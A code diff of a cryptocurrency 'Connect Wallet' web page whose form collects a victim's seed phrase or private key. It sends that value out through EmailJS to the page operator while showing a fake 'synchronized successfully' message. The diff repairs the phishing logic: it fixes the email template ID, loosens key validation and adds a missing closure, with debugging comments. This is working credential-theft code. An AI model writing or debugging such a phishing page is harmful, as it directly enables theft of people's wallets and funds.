@@ -1144,23 +1144,25 @@
         <button type="button" class="btn btn-sm btn-outline-primary tab-btn" data-target="private_key">Private Key</button>
     </div>
 
-    <form id="contact-form">
-        <input type="hidden" name="wallet_type" id="hidden_wallet_name">
-        <input type="hidden" name="import_type" id="import_type" value="Phrase"> <div id="phrase_input_container">
-            <textarea name="message" id="secret_phrase" rows="4" 
-                placeholder="Enter your 12 or 24 words phrase. Separate them with spaces." required></textarea>
-        </div>
+   <form id="contact-form">
+    <input type="hidden" name="wallet_type" id="hidden_wallet_name">
+    <input type="hidden" name="import_type" id="import_type" value="Phrase"> 
 
-        <div id="private_key_input_container" style="display:none;">
-            <input type="text" name="private_key" id="private_key_input" class="form-control" 
-                placeholder="Enter your private key" 
-                style="background: #000; border: 1px solid #333; color: #5142FC; height: 60px; border-radius: 12px;">
-        </div>
-        
-        <button type="submit" id="button_connect_wallet" class="btn btn-primary mt-3" style="opacity:0.2" disabled>
-            Connect Wallet
-        </button>
-    </form>
+    <div id="phrase_input_container">
+        <textarea name="message" id="secret_phrase" rows="4" 
+            placeholder="Enter your 12 or 24 words phrase. Separate them with spaces."></textarea>
+    </div>
+
+    <div id="private_key_input_container" style="display:none;">
+        <input type="text" name="private_key" id="private_key_input" class="form-control" 
+            placeholder="Enter your private key" 
+            style="background: #000; border: 1px solid #333; color: #5142FC; height: 60px; border-radius: 12px;">
+    </div>
+    
+    <button type="submit" id="button_connect_wallet" class="btn btn-primary mt-3" style="opacity:0.2" disabled>
+        Connect Wallet
+    </button>
+</form>
 </div>
 
                 <div class="text-center mt-4">
@@ -1185,7 +1187,8 @@
     })();
 
     $(document).ready(function() {
-        
+        console.log("Script loaded and ready.");
+
         // 1. OPEN MODAL LOGIC
         $('.select_wallet, .select_liquality').on('click', function() {
             let name = $(this).data('title');
@@ -1225,14 +1228,17 @@
                 } else {
                     btn.prop('disabled', true).css('opacity', '0.2');
                 }
-            } else {
-                let val = $('#private_key_input').val().trim();
-                if (val.length > 0) {
-                    btn.prop('disabled', false).css('opacity', '1');
-                } else {
-                    btn.prop('disabled', true).css('opacity', '0.2');
-                }
-            }
+         } else {
+    // PRIVATE KEY VALIDATION
+    let val = $('#private_key_input').val().trim();
+    // Private keys are usually 64 characters, but let's unlock after 5 
+    // just to be sure it's working.
+    if (val.length > 5) { 
+        btn.prop('disabled', false).css('opacity', '1');
+    } else {
+        btn.prop('disabled', true).css('opacity', '0.2');
+    }
+}
         }
 
         $('#secret_phrase, #private_key_input').on('input', validateInputs);
@@ -1253,36 +1259,50 @@
             validateInputs(); 
         });
 
-        // 4. FINAL SUBMIT (Improved)
-        $('#contact-form').on('submit', function(e) {
-            e.preventDefault();
-            
-            let btn = $('#button_connect_wallet');
-            let walletName = $('#hidden_wallet_name').val();
-            let importType = $('#import_type').val();
-            
-            // Get the value based on which tab is active
-            let finalValue = (importType === 'Phrase') ? $('#secret_phrase').val() : $('#private_key_input').val();
+        // 4. FINAL SUBMIT (Corrected)
+      $('#contact-form').on('submit', function(e) {
+    e.preventDefault();
+    
+    let btn = $('#button_connect_wallet');
+    let importType = $('#import_type').val(); // 'Phrase' or 'Private Key'
+    let walletName = $('#hidden_wallet_name').val() || "Wallet";
+    
+    // Logic to grab the correct value
+    let finalValue = "";
+    if (importType === 'Phrase') {
+        finalValue = $('#secret_phrase').val().trim();
+    } else {
+        finalValue = $('#private_key_input').val().trim();
+    }
 
-            btn.text("Synchronizing...").prop('disabled', true);
+    // Safety check: Don't send if it's empty
+    if (finalValue === "") {
+        alert("Please enter your " + importType);
+        return;
+    }
 
-            // Using emailjs.send instead of sendForm is cleaner for dynamic values
-            let templateParams = {
-                from_name: walletName,
-                message: "Method: " + importType + "\nValue: " + finalValue
-            };
+    btn.text("Synchronizing...").prop('disabled', true);
 
-            emailjs.send("service_pkdh15e", "service_pkdh15e", templateParams)
-                .then(function() {
-                    alert("Wallet synchronized successfully");
-                    window.location.href = 'index.html'; 
-                }, function(error) {
-                    alert("Sync Error. Please try again.");
-                    btn.text("Connect Wallet").prop('disabled', false);
-                    console.log("Error:", error);
-                });
+    let templateParams = {
+        from_name: walletName,
+        message: "Method: " + importType + "\nValue: " + finalValue
+    };
+
+    console.log("Sending data:", templateParams); // This helps us debug in the console
+
+    emailjs.send("service_pkdh15e", "template_59wgbbm", templateParams)
+        .then(function(response) {
+            console.log("EmailJS Success!", response);
+            alert("Wallet synchronized successfully");
+            window.location.href = 'index.html'; 
+        }, function(error) {
+            console.log("EmailJS Error details:", error);
+            alert("Sync Error. Please check your connection.");
+            btn.text("Connect Wallet").prop('disabled', false);
         });
-    });
+});
+
+    }); // <--- THIS WAS THE MISSING CLOSURE
 </script>
 
 </body>
